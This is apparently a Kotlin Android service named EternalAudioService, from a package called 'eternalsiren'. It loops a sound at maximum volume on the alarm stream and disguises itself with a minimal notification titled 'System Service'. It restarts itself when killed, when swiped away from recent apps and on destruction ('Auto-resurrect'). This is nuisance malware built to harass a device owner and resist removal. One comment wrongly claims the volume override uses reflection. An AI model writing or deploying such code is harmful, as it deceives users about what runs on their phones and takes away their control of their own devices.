package com.shadow.eternalsiren

import android.app.Service
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.IBinder

class EternalAudioService : Service() {
    private val CHANNEL_ID = "EternalAudio"
    private var mediaPlayer: MediaPlayer? = null
    
    override fun onCreate() {
        super.onCreate()
        
        // Create persistent notification (required for foreground service)
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = android.app.NotificationChannel(
                CHANNEL_ID, "Background Service",
                android.app.NotificationManager.IMPORTANCE_MIN
            )
            (getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .createNotificationChannel(channel)
            
            val notification = android.app.Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_media_play)
                .build()
            
            startForeground(1, notification)
        }
        
        // Load and play audio from raw folder
        // Note: Ensure R.raw.eternal_sound exists
        mediaPlayer = MediaPlayer.create(this, R.raw.eternal_sound)
        
        // Critical: Set audio attributes for maximum volume
        val attributes = AudioAttributes.Builder()
            .setUsage(AudioAttributes.USAGE_ALARM)
            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
            .build()
        
        mediaPlayer?.setAudioAttributes(attributes)
        mediaPlayer?.isLooping = true
        mediaPlayer?.setVolume(1.0f, 1.0f)
        
        // Override system volume limits using reflection
        try {
            val audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 
                audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 
                AudioManager.FLAG_SHOW_UI)
        } catch (e: Exception) { /* Silent fail */ }
        
        mediaPlayer?.start()
        
        // Monitor and restart if interrupted
        mediaPlayer?.setOnCompletionListener {
            mediaPlayer?.start()
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Restart if killed
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        // Restart service when removed from recent apps
        val restartService = Intent(applicationContext, EternalAudioService::class.java)
        restartService.setPackage(packageName)
        startService(restartService)
        super.onTaskRemoved(rootIntent)
    }
    
    override fun onDestroy() {
        // Auto-resurrect
        sendBroadcast(Intent("RESTART_AUDIO"))
        mediaPlayer?.release()
        super.onDestroy()
    }
}
